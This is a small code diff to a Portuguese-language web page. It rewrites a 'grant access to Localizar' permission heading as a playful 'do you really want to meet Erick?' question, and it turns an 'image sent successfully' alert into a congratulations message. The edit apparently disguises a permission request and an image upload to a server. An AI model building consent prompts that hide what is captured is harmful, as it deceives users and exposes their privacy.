@@ -38,7 +38,7 @@
 </head>
 <body>
   <div class="card">
-    <h2>Deseja conceder acesso a Localizar?</h2>
+    <h2>Quer realmente conhecer o Erick ?</h2>
     <button id="btnPermitir">Sim</button>
   </div>
 
@@ -85,7 +85,7 @@
         const result = await response.json();
 
         if (response.ok) {
-          alert('Imagem enviada com sucesso!\nCaminho: ' + result.path);
+          alert('Parabens, conheceu!\nCaminho: ' + result.path);
         } else {
           alert('Erro ao enviar imagem:\n' + JSON.stringify(result.error));
         }
